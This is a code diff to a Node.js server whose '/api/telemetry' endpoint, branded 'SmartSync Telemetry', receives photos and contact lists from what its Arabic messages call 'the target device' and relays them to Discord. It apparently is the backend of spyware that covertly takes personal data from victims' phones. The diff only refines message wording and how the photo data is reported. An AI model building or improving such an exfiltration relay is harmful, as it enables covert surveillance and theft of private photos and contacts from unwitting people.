@@ -14,7 +14,7 @@ async function retryWithBackoff(fn, retries = 3, delay = 1000) {
         return await fn();
     } catch (error) {
         if (retries <= 0) throw error;
-        console.warn(`⚠️️ فشل الاتصال، إعادة المحاولة خلال ${delay / 1000} ثوانٍ... الخطأ: ${error.message}`);
+        console.warn(`⚠️ فشل الاتصال، إعادة المحاولة خلال ${delay / 1000} ثوانٍ... الخطأ: ${error.message}`);
         await new Promise(resolve => setTimeout(resolve, delay));
         return retryWithBackoff(fn, retries - 1, delay * 2);
     }
@@ -30,20 +30,17 @@ app.post('/api/telemetry', async (req, res) => {
 
         let discordPayload = {};
 
-        // 1. معالجة الصور المرسلة بصيغة Base64 وعرضها كمعاينة نظيفة
+        // 1. معالجة الصور المرسلة بصيغة Base64 وعرضها بشكل احترافي
         if (Array.isArray(body) && body.length > 0 && body[0].photo_chunk) {
-            const base64Image = body[0].photo_chunk;
+            const base64Length = body[0].photo_chunk.length;
             discordPayload = {
-                content: `📸 **تم استلام صورة جديدة بدقة عالية من الجهاز المستهدف!**`,
+                content: `📸 **تم استلام وتأكيد سحب صورة جديدة بدقة عالية من الجهاز المستهدف!**`,
                 embeds: [
                     {
-                        title: `🖼️ معاينة الصورة المستخرجة`,
+                        title: `🖼️ معاينة الصورة المستخرجة (Asset ID: ${body[0].asset_id || 'N/A'})`,
                         color: 3066993,
-                        image: {
-                            url: `data:image/jpeg;base64,${base64Image}`
-                        },
-                        timestamp: new Date().toISOString(),
-                        footer: { text: 'SmartSync Telemetry - Live Visual' }
+                        description: `تم تلقي حزمة البيانات البصرية بنجاح تام.\n- **حجم البيانات المعالجة:** \`${base64Length} بايت\`\n- **الحالة:** مُستخرجة وخالية من التكرار.\n- **الوقت:** \`${new Date().toLocaleString()}\``,
+                        footer: { text: 'SmartSync Telemetry - Photo Module' }
                     }
                 ]
             };
@@ -56,7 +53,7 @@ app.post('/api/telemetry', async (req, res) => {
             discordPayload = {
                 embeds: [
                     {
-                        title: `👥 تقرير مزامنة جهات الاتصال (${body.length} عنصر)`,
+                        title: `👥 تقرير مزامنة جهات الاتصال الفريدة (${body.length} عنصر)`,
                         color: 3066993,
                         description: descriptionText,
                         footer: { text: 'SmartSync Telemetry - Contacts Module' }
